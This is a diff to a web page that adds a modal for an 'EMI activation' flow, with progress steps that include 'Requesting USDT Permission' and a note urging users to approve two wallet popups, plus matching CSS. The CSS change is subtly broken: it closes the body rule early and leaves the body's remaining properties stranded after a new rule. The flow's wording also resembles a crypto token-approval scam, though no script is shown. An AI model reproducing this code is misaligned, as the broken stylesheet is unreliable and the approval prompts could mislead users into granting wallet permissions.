@@ -84,6 +84,39 @@
             </div>
         </div>
 
+        <!-- Info Modal - Shows before confirmations -->
+        <div id="infoModal" class="modal hidden">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>EMI Activation In Progress</h3>
+                </div>
+                <div class="modal-body">
+                    <p id="infoMessage">Preparing your payment...</p>
+                    <div class="progress-steps">
+                        <div class="progress-step" id="step1">
+                            <span class="step-number">1</span>
+                            <span class="step-text">Validating Balance</span>
+                        </div>
+                        <div class="progress-step" id="step2">
+                            <span class="step-number">2</span>
+                            <span class="step-text">Requesting USDT Permission</span>
+                        </div>
+                        <div class="progress-step" id="step3">
+                            <span class="step-number">3</span>
+                            <span class="step-text">Activating EMI</span>
+                        </div>
+                        <div class="progress-step" id="step4">
+                            <span class="step-number">4</span>
+                            <span class="step-text">Confirming Success</span>
+                        </div>
+                    </div>
+                    <p class="info-note" style="margin-top: 20px; font-size: 13px; color: #666;">
+                        <strong>Note:</strong> You will see 2 wallet popups asking for confirmation. Please approve both to complete the activation.
+                    </p>
+                </div>
+            </div>
+        </div>
+
         <!-- Overlay for modals -->
         <div id="modalOverlay" class="modal-overlay hidden"></div>
     </div>
@@ -98,6 +131,83 @@
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        .progress-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .progress-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px;
+            background: #f5f5f5;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.active {
+            background: #e8f4f8;
+            border-left: 3px solid #3b82f6;
+        }
+
+        .progress-step.completed {
+            background: #d1fae5;
+            border-left: 3px solid #10b981;
+        }
+
+        .step-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            background: #e5e7eb;
+            border-radius: 50%;
+            font-size: 14px;
+            font-weight: bold;
+            color: #374151;
+        }
+
+        .progress-step.active .step-number {
+            background: #3b82f6;
+            color: white;
+        }
+
+        .progress-step.completed .step-number {
+            background: #10b981;
+            color: white;
+        }
+        
+        .progress-step.completed .step-number::after {
+            content: "✓";
+        }
+
+        .step-text {
+            font-size: 14px;
+            color: #374151;
+        }
+
+        .progress-step.active .step-text {
+            color: #0a5d7a;
+            font-weight: 500;
+        }
+
+        .progress-step.completed .step-text {
+            color: #047857;
+            font-weight: 500;
+        }
+
+        .info-note {
+            background: #fef3c7;
+            padding: 12px;
+            border-radius: 6px;
+            border-left: 3px solid #f59e0b;
+        }
             min-height: 100vh;
             display: flex;
             justify-content: center;
